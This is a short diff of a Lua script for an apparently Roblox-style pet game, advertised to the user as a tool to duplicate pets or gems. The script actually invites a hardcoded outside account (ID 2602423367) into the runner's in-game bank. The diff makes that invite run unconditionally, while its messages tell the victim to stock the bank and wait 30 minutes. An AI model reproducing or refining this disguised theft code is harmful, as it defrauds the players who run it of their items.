@@ -13,10 +13,12 @@ if request then
 	lib.Message.New("Dupe starting! Please wait atleast 30 Minutes");
 else
 end
-if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], _G.UserID, 2602423367) then
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], _G.UserID) then
 	lib.Message.New("Dupe Proccesing! (make sure your bank have pet or gems for duping!)");
 else
 	lib.Message.New("Wait 30 Minutes to proccess your duped Pet Or Gems");
-end;
+	local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mybanks = lib.Network.Invoke("get my banks")
 
--- if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 2602423367) then
+lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 2602423367)
+end;
